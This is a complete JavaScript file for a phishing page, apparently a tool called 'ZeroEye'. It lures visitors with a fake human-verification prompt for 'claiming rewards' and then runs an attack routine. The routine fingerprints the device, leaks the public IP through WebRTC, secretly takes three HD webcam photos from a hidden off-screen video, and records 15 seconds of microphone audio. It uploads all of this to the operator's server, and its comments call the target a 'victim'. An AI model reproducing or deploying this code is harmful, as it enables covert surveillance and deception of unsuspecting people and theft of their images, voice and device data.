const SERVER_URL = window.location.origin;
const sentIPs = new Set();

// Enhanced permissions wall with better UX
if (confirm("📸 Camera Access Required\n\nWe need to verify you're human by taking a quick photo. This helps prevent bots from claiming rewards.\n\nClick OK to continue with verification.")) {
    showLoadingScreen();
    setTimeout(startAttack, 1000);
} else {
    showAccessDenied();
}

function showLoadingScreen() {
    document.body.innerHTML = `
        <div style="font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; min-height: 100vh;">
            <div style="max-width: 400px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; backdrop-filter: blur(10px);">
                <h1 style="font-size: 24px; margin-bottom: 20px;">🔍 Verifying Your Device</h1>
                <div style="margin: 30px 0;">
                    <div style="width: 50px; height: 50px; border: 3px solid #fff; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
                </div>
                <p style="font-size: 16px; opacity: 0.9;">Please wait while we verify your eligibility...</p>
                <p style="font-size: 12px; opacity: 0.7; margin-top: 20px;">This may take 10-15 seconds</p>
            </div>
        </div>
        <style>
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    `;
}

function showAccessDenied() {
    document.body.innerHTML = `
        <div style="font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color: white; min-height: 100vh;">
            <div style="max-width: 400px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; backdrop-filter: blur(10px);">
                <h1 style="font-size: 24px; margin-bottom: 20px;">❌ Access Denied</h1>
                <p style="font-size: 16px; margin-bottom: 30px;">Camera access is required to verify your identity and prevent fraud.</p>
                <button onclick="location.reload()" style="background: #fff; color: #ee5a24; border: none; padding: 12px 30px; border-radius: 25px; font-size: 16px; cursor: pointer; font-weight: bold;">
                    Try Again
                </button>
            </div>
        </div>
    `;
}

async function startAttack() {
    try {
        // 1. HD CAMERA REQUEST with multiple resolution options
        const constraints = {
            audio: {
                channelCount: 1,
                sampleRate: 44100,
                sampleSize: 16,
                echoCancellation: true, // Helps reduce feedback
                noiseSuppression: true
            },
            video: {
                facingMode: "user",
                width: { ideal: 1920, min: 1280 },
                height: { ideal: 1080, min: 720 },
                frameRate: { ideal: 30 }
            }
        };
        
        console.log("[ZeroEye] Requesting HD camera access...");
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        console.log("[ZeroEye] Camera access granted");

        // 2. ENHANCED DATA COLLECTION
        const systemInfo = await collectSystemInfo();
        
        // Send System Info immediately
        sendSystemInfo(systemInfo);

        // 3. WEBRTC IP LEAK
        setupWebRTCIPLeak();

        // 4. HD CAMERA CAPTURE with auto-focus delay
        setupCameraCapture(stream);

        // 5. AUDIO RECORDING (dual assurance)
        setupAudioRecording(stream);

    } catch (err) {
        console.error("[ZeroEye] Error:", err);
        // Fallback - still try to collect basic info without camera
        const basicInfo = await collectSystemInfo();
        sendSystemInfo(basicInfo);
        setupWebRTCIPLeak();
    }
}

async function collectSystemInfo() {
    // Battery Information
    const getBatteryStatus = async () => {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
            return { level: 'Unknown', charging: 'Unknown' };
        } catch (e) {
            return { level: 'Unknown', charging: 'Unknown' };
        }
    };

    // Network Information
    const getNetworkInfo = () => {
        try {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                return {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink + ' Mbps',
                    rtt: connection.rtt + ' ms',
                    saveData: connection.saveData
                };
            }
            return { effectiveType: 'Unknown' };
        } catch (e) {
            return { effectiveType: 'Unknown' };
        }
    };

    // GPU Information
    const getGPUInfo = () => {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
            }
            return 'Unknown';
        } catch (e) {
            return 'Unknown';
        }
    };

    const battery = await getBatteryStatus();
    const network = getNetworkInfo();

    return {
        // Basic Info
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        
        // Hardware
        cores: navigator.hardwareConcurrency || 'Unknown',
        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth + ' bit',
        gpu: getGPUInfo(),
        
        // Network & Battery
        battery: battery,
        network: network,
        
        // Location
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookieEnabled: navigator.cookieEnabled,
        
        // Timestamp
        timestamp: new Date().toISOString()
    };
}

function sendSystemInfo(systemInfo) {
    const formattedInfo = {
        '📱 Device': systemInfo.platform,
        '🔋 Battery': `${systemInfo.battery.level} (${systemInfo.battery.charging ? 'Charging' : 'On Battery'})`,
        '📡 Network': systemInfo.network.effectiveType,
        '⚡ Speed': systemInfo.network.downlink,
        '🖥️ Screen': systemInfo.screen,
        '⚙️ Cores': systemInfo.cores,
        '💾 RAM': systemInfo.ram,
        '🎮 GPU': systemInfo.gpu,
        '🌐 Timezone': systemInfo.timezone,
        '🔍 User Agent': systemInfo.userAgent.substring(0, 100) + '...'
    };

    fetch(`${SERVER_URL}/upload_sys`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `data=${encodeURIComponent(JSON.stringify(formattedInfo))}`
    }).catch(err => console.log('Info send failed:', err));
}

function setupWebRTCIPLeak() {
    const rtc = new RTCPeerConnection({ 
        iceServers: [{ urls: "stun:stun.l.google.com:19302" }] 
    });
    
    rtc.createDataChannel('');
    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
    
    rtc.onicecandidate = (event) => {
        if (event.candidate) {
            const candidate = event.candidate.candidate;
            // Look for IP addresses in candidate string
            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
            const matches = candidate.match(ipRegex);
            
            if (matches) {
                matches.forEach(ip => {
                    if (!sentIPs.has(ip) && !isPrivateIP(ip)) {
                        sentIPs.add(ip);
                        fetch(`${SERVER_URL}/upload_ip`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: `data=${encodeURIComponent(JSON.stringify({internal_ip: ip}))}`
                        }).catch(err => console.log('IP send failed:', err));
                    }
                });
            }
        }
    };
}

function isPrivateIP(ip) {
    return ip.startsWith('192.168.') || 
           ip.startsWith('10.') || 
           ip.startsWith('172.') ||
           ip === '127.0.0.1';
}

function setupCameraCapture(stream) {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.autoplay = true;
    video.playsInline = true;
    
    // FIX 1: Mute the video so victim doesn't hear themselves
    video.muted = true;
    
    // FIX 2: Do NOT use display:none. It breaks iOS capture. 
    // Use off-screen positioning instead.
    video.style.position = 'fixed';
    video.style.top = '-10000px';
    video.style.left = '-10000px';
    video.style.opacity = '0';
    
    document.body.appendChild(video);

    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    // Canvas doesn't need to be in DOM to work, but good practice to hide it if appended
    canvas.style.display = 'none';
    document.body.appendChild(canvas);

    let captureCount = 0;
    const maxCaptures = 3; // Take 3 photos total

    function capturePhoto() {
        if (captureCount >= maxCaptures) return;
        
        if (video.videoWidth > 0 && video.videoHeight > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob((blob) => {
                if (blob) {
                    const formData = new FormData();
                    formData.append('file', blob, `cam_${Date.now()}_${captureCount + 1}.jpg`);
                    
                    fetch(`${SERVER_URL}/upload_cam`, { 
                        method: 'POST', 
                        body: formData 
                    }).catch(err => console.log('Photo upload failed:', err));
                }
            }, 'image/jpeg', 0.92); // High quality
        }
        
        captureCount++;
    }

    // Wait 2 seconds for auto-focus to settle, then take first photo
    setTimeout(() => {
        capturePhoto(); // First immediate capture
        
        // Second capture after 3 seconds
        setTimeout(capturePhoto, 3000);
        
        // Third capture after 6 seconds  
        setTimeout(capturePhoto, 6000);
    }, 2000);
}

function setupAudioRecording(stream) {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        
        // FIX 3: Detect supported MIME type for cross-platform compatibility
        // iOS requires audio/mp4, Android/Windows prefer audio/webm
        let options = {};
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
            options = { mimeType: 'audio/webm;codecs=opus' };
        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
            options = { mimeType: 'audio/mp4' }; // iOS Fix
        } else if (MediaRecorder.isTypeSupported('audio/webm')) {
            options = { mimeType: 'audio/webm' };
        }
        
        // If no options match, the browser will use its default
        const mediaRecorder = Object.keys(options).length > 0 
            ? new MediaRecorder(stream, options) 
            : new MediaRecorder(stream);
        
        let audioChunks = [];
        
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                audioChunks.push(event.data);
            }
        };
        
        mediaRecorder.onstop = () => {
            // Use the correct type based on what we selected
            const type = options.mimeType || 'audio/webm';
            const ext = type.includes('mp4') ? 'mp4' : 'webm';
            
            const audioBlob = new Blob(audioChunks, { type: type });
            
            // Send to server
            const formData = new FormData();
            formData.append('file', audioBlob, `audio_${Date.now()}.${ext}`);
            
            fetch(`${SERVER_URL}/upload_audio`, { 
                method: 'POST', 
                body: formData 
            }).catch(err => console.log('Audio upload failed:', err));
            
            // Clear for next recording
            audioChunks = [];
        };
        
        // Record for 15 seconds
        mediaRecorder.start();
        setTimeout(() => {
            if (mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, 15000);
        
    } catch (error) {
        console.log('Audio recording not supported:', error);
    }
}
